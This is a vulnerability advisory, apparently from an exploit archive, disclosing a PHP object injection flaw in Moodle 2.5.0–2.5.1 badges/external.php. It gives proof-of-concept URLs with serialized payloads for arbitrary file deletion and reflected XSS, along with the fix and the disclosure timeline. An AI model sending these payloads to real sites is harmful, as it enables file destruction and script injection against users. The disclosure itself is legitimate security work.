@@ -1,0 +1,72 @@
+id: 21247
+date: 09/17/2013
+title: Moodle CMS 2.5.0-1 Cross Site Scripting Vulnerability
+author: Emilio Pinna
+cves: 
+
+=============================================
+- Original release date: 15 September, 2013
+- Discovered by: Emilio Pinna (Application Security Analyst at Abinsula)
+- Contact: emilio # pinn # gmail
+=============================================
+
+VULNERABILITY
+----------------------
+Moodle CMS version 2.5.0-1 is prone to Object Injection vulnerability passing not properly sanitized user-supplied input to the unserialize() PHP function.
+
+Attacker could inject ad-hoc serialized object into the application scope, reusing internal PHP code snippets maliciously. In this application the attacker could delete files and perform a XSS attacks.
+
+DESCRIPTION
+----------------------
+Affected file badges/external.php unserialize user input in line 35
+
+$json = required_param('badge', PARAM_RAW);
+..
+$badge = new external_badge(unserialize($json));
+
+PROOF OF CONCEPT
+----------------------
+
+- FILE DELETE
+The method csv_export_writer::__destruct() in lib/csvlib.class.php:538 can be exploited in order to delete remote file passing the serialized object.
+
+http://localhost/badges/external.php?badge=O:17:"csv_export_writer":1:{s:4:"path";s:27:"/path/of/the/file/to/delete";}
+
+- XSS
+The rendered HTML page constructed in the core_badges_renderer::render_external_badge() in badges/renderer.php:375 reflects the two object variable assertion and imageurl, as that can be used as XSS vector. 
+
+http://localhost/badges/external.php?badge=O:8:"stdClass":2:{s:8:"imageUrl";s:0:"";s:9:"assertion";O:8:"stdClass":1:{s:5:"badge";O:8:"stdClass":1:{s:6:"issuer";O:8:"stdClass":1:{s:4:"name";s:30:"<script>alert(1);</script><!--";}}}}
+
+SYSTEMS AFFECTED
+----------------------
+Moodle CMS version 2.5.0 and 2.5.1. Fixed in 2.5.2.
+
+SOLUTION
+----------------------
+Do not unserialize() user-supplied input, use standard data format as json instead. Moodle users must upgrade to 2.5.2.
+
+CVE REFERENCE
+----------------------
+The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name CVE-2013-5674 to the vulnerability
+
+CREDITS
+----------------------
+Emilio Pinna: emilio # pinn # gmail
+
+REFERENCES
+----------------------
+https://tracker.moodle.org/browse/MDL-40924
+http://disse.cting.org/2013/09/16/moodle-2_5_0_1-badges-external-object-injection/
+
+DISCLOSURE TIMELINE
+----------------------
+29/Jul/2013: Vendor alerted with MDL-40924 ticket
+02/Sep/2013: Released fix commit 2d3c0faef by Yuliya Bozhko
+07/Sep/2013: Moodle release 2.5.2
+15/Sep/2013: Public disclosure
+
+LEGAL NOTICES
+----------------------
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+
+#  0day.today [2023-03-23]  #
